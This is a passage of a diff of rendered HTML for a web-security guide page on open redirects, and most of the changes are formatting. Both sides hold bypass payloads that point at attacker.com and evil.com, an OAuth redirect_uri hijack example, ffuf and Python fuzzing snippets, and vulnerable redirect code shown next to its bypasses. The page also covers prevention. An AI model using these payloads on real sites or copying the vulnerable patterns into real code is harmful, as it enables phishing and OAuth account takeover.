 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">HTTP</span> <span style="color:#ae81ff">301</span><span style="color:#f92672">/</span><span style="color:#ae81ff">302</span><span style="color:#f92672">/</span><span style="color:#ae81ff">303</span><span style="color:#f92672">/</span><span style="color:#ae81ff">307</span><span style="color:#f92672">/</span><span style="color:#ae81ff">308</span> <span style="color:#a6e22e">status</span> <span style="color:#a6e22e">codes</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Location</span> <span style="color:#a6e22e">header</span> <span style="color:#a6e22e">pointing</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">input</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Meta</span> <span style="color:#a6e22e">refresh</span> <span style="color:#a6e22e">tags</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">redirects</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">response</span>
-</span></span></code></pre></div><p><strong>3. Browser Behavior Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Open</span> <span style="color:#a6e22e">URL</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">browser</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">dev</span> <span style="color:#a6e22e">tools</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">redirects</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">response</span></span></span></code></pre></div><p><strong>3. Browser Behavior Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Open</span> <span style="color:#a6e22e">URL</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">browser</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">dev</span> <span style="color:#a6e22e">tools</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Monitor</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Network</span> <span style="color:#a6e22e">tab</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">chain</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Console</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">JavaScript</span> <span style="color:#a6e22e">redirects</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Final</span> <span style="color:#a6e22e">destination</span> <span style="color:#a6e22e">URL</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Any</span> <span style="color:#a6e22e">validation</span> <span style="color:#a6e22e">error</span> <span style="color:#a6e22e">messages</span>
-</span></span></code></pre></div><p><strong>4. Validation Bypass Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">bypass</span> <span style="color:#a6e22e">techniques</span> <span style="color:#a6e22e">systematically</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Any</span> <span style="color:#a6e22e">validation</span> <span style="color:#a6e22e">error</span> <span style="color:#a6e22e">messages</span></span></span></code></pre></div><p><strong>4. Validation Bypass Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">bypass</span> <span style="color:#a6e22e">techniques</span> <span style="color:#a6e22e">systematically</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://trusted.com@attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://trusted.com.attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=///attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=////attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=/\/\/attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=%2F%2Fattacker.com
-</span></span></span></code></pre></div><p><strong>5. OAuth Flow Testing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Manipulate</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">redirect_uri</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=https://trusted.com.attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=//attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=///attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=////attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/redirect?url=/\/\/attacker.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//site.com/redirect?url=%2F%2Fattacker.com</span></span></span></code></pre></div><p><strong>5. OAuth Flow Testing:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Manipulate</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">redirect_uri</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//oauth-provider.com/authorize?
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">authorization</span> <span style="color:#a6e22e">code</span> <span style="color:#a6e22e">sent</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">URL</span>
-</span></span></code></pre></div><h3 id="automated-testing-tools">
-  Automated Testing Tools
-  <a class="anchor" href="#automated-testing-tools">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">authorization</span> <span style="color:#a6e22e">code</span> <span style="color:#a6e22e">sent</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">malicious</span> <span style="color:#a6e22e">URL</span></span></span></code></pre></div><h3 id="automated-testing-tools">Automated Testing Tools<a class="anchor" href="#automated-testing-tools">#</a></h3>
 <p><strong>1. Custom Python Script:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">payloads</span> <span style="color:#f92672">=</span> [
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://evil.com&#34;</span>,
@@ -1940,17 +1779,15 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#34;    Location: {location}&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Usage</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">test_open_redirect</span>(<span style="color:#e6db74">&#34;https://target.com/redirect&#34;</span>, <span style="color:#e6db74">&#34;url&#34;</span>)
-</span></span></code></pre></div><p><strong>2. Burp Suite Intruder:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">request</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Burp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">test_open_redirect</span>(<span style="color:#e6db74">&#34;https://target.com/redirect&#34;</span>, <span style="color:#e6db74">&#34;url&#34;</span>)</span></span></code></pre></div><p><strong>2. Burp Suite Intruder:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Capture</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">request</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Burp</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Send</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Intruder</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Mark</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">parameter</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">insertion</span> <span style="color:#a6e22e">point</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Load</span> <span style="color:#a6e22e">open</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">list</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Start</span> <span style="color:#a6e22e">attack</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.</span> <span style="color:#a6e22e">Filter</span> <span style="color:#a6e22e">responses</span> <span style="color:#66d9ef">with</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">xx</span> <span style="color:#a6e22e">status</span> <span style="color:#a6e22e">codes</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">Location</span> <span style="color:#a6e22e">header</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">attacker</span> <span style="color:#a6e22e">domain</span>
-</span></span></code></pre></div><p><strong>3. FFUF for Parameter Discovery:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Find</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">parameters</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">Location</span> <span style="color:#a6e22e">header</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">attacker</span> <span style="color:#a6e22e">domain</span></span></span></code></pre></div><p><strong>3. FFUF for Parameter Discovery:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Find</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">parameters</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">ffuf</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;https://target.com/FUZZ?url=https://evil.com&#34;</span> <span style="color:#f92672">\</span>
 </span></span><span style="display:flex;"><span>     <span style="color:#f92672">-</span><span style="color:#a6e22e">w</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">path</span><span style="color:#f92672">/</span><span style="color:#a6e22e">to</span><span style="color:#f92672">/</span><span style="color:#a6e22e">wordlist</span>.<span style="color:#a6e22e">txt</span> <span style="color:#f92672">\</span>
 </span></span><span style="display:flex;"><span>     <span style="color:#f92672">-</span><span style="color:#a6e22e">mc</span> <span style="color:#ae81ff">301</span>,<span style="color:#ae81ff">302</span>,<span style="color:#ae81ff">303</span>,<span style="color:#ae81ff">307</span>,<span style="color:#ae81ff">308</span> <span style="color:#f92672">\</span>
@@ -1959,28 +1796,23 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">discovered</span> <span style="color:#a6e22e">parameters</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">ffuf</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;https://target.com/redirect?FUZZ=https://evil.com&#34;</span> <span style="color:#f92672">\</span>
 </span></span><span style="display:flex;"><span>     <span style="color:#f92672">-</span><span style="color:#a6e22e">w</span> <span style="color:#a6e22e">redirect</span><span style="color:#f92672">-</span><span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">txt</span> <span style="color:#f92672">\</span>
-</span></span><span style="display:flex;"><span>     <span style="color:#f92672">-</span><span style="color:#a6e22e">mc</span> <span style="color:#ae81ff">301</span>,<span style="color:#ae81ff">302</span>,<span style="color:#ae81ff">303</span>,<span style="color:#ae81ff">307</span>,<span style="color:#ae81ff">308</span>
-</span></span></code></pre></div><h3 id="pattern-recognition">
-  Pattern Recognition
-  <a class="anchor" href="#pattern-recognition">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">-</span><span style="color:#a6e22e">mc</span> <span style="color:#ae81ff">301</span>,<span style="color:#ae81ff">302</span>,<span style="color:#ae81ff">303</span>,<span style="color:#ae81ff">307</span>,<span style="color:#ae81ff">308</span></span></span></code></pre></div><h3 id="pattern-recognition">Pattern Recognition<a class="anchor" href="#pattern-recognition">#</a></h3>
 <p><strong>Common Vulnerable Patterns in Code:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable: Direct use of user input
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;redirect&#39;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable: Direct use of user input
+</span></span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;redirect&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable: Insufficient validation
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">redirect</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">redirect</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>)) {
 </span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">redirect</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Bypass: //evil.com starts with /
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable: Regex bypass
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/^https:\/\/trusted\.com/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">redirect</span>)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/^https:\/\/trusted\.com/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">redirect</span>)) {
 </span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">redirect</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Bypass: https://trusted.com@evil.com
-</span></span></span></code></pre></div><p><strong>Server-Side Vulnerable Patterns:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Vulnerable</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">validation</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// Bypass: https://trusted.com@evil.com</span></span></span></code></pre></div><p><strong>Server-Side Vulnerable Patterns:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Vulnerable</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">validation</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/redirect&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">redirect_handler</span>()<span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;url&#39;</span>)
@@ -1992,12 +1824,8 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;url&#39;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;trusted.com&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">redirect</span>(<span style="color:#a6e22e">url</span>)
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Bypass</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">evil</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span>
-</span></span></code></pre></div><hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Bypass</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">evil</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">trusted</span>.<span style="color:#a6e22e">com</span></span></span></code></pre></div><hr>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Phishing:</strong> Open redirects enable trusted-domain phishing, leading to credential theft and account compromise.</li>
 <li><strong>OAuth Account Takeover:</strong> Unvalidated <code>redirect_uri</code> parameters can expose authorization codes, resulting in full account takeover.</li>
@@ -2010,10 +1838,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>CORS Bypass &amp; Data Theft:</strong> Open redirects on trusted origins can facilitate cross-origin data exfiltration and sensitive information disclosure.</li>
 </ul>
 <hr>
-<h2 id="prevention">
-  Prevention
-  <a class="anchor" href="#prevention">#</a>
-</h2>
+<h2 id="prevention">Prevention<a class="anchor" href="#prevention">#</a></h2>
 <ul>
 <li><strong>Allowlist Redirects:</strong> Only permit redirects to explicitly approved destinations and block all untrusted URLs.</li>
 <li><strong>Use Indirect References:</strong> Replace user-supplied URLs with server-side mapped destination IDs.</li>
@@ -2030,41 +1855,35 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Validate Destinations Before Sending Sensitive Data:</strong> Ensure tokens, assertions, and credentials are only sent to trusted and pre-approved endpoints.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Purpose</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://github.com/yogsec/Open-Redirect-Payloads" target="_blank" rel="noreferrer noopener nofollow">Open-Redirect-Payloads</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Collection of open redirect bypass payloads</td>
-</tr>
-<tr>
-<td><a href="https://github.com/devanshbatham/OpenRedireX" target="_blank" rel="noreferrer noopener nofollow">OpenRedireX</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Automated open redirect fuzzer</td>
-</tr>
-<tr>
-<td><a href="https://github.com/tomnomnom/waybackurls" target="_blank" rel="noreferrer noopener nofollow">Waybackurls</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Find historical redirect parameters from archives</td>
-</tr>
-<tr>
-<td><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noreferrer noopener nofollow">Nuclei</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
-<td>Automated templates for open redirect detection</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Purpose</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><a href="https://github.com/yogsec/Open-Redirect-Payloads" target="_blank" rel="noreferrer noopener nofollow">Open-Redirect-Payloads</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Collection of open redirect bypass payloads</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/devanshbatham/OpenRedireX" target="_blank" rel="noreferrer noopener nofollow">OpenRedireX</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Automated open redirect fuzzer</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/tomnomnom/waybackurls" target="_blank" rel="noreferrer noopener nofollow">Waybackurls</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Find historical redirect parameters from archives</td>
+			</tr>
+			<tr>
+					<td><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noreferrer noopener nofollow">Nuclei</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></td>
+					<td>Automated templates for open redirect detection</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  Good to Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPREDIRECT.md" target="_blank" rel="noreferrer noopener nofollow">HackerOne - Top 25 Open Redirect Reports</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://blog.intigriti.com/2021/06/16/hacker-tools-open-redirect-to-account-takeover/" target="_blank" rel="noreferrer noopener nofollow">Intigriti - Open Redirect to Account Takeover</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2072,10 +1891,7 @@ https://github.com/alex-shpak/hugo-book
 <li><a href="https://hackerone.com/reports/2731" target="_blank" rel="noreferrer noopener nofollow">HackerOne Report #2731</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> - Slack Open Redirect</li>
 </ul>
 <hr>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
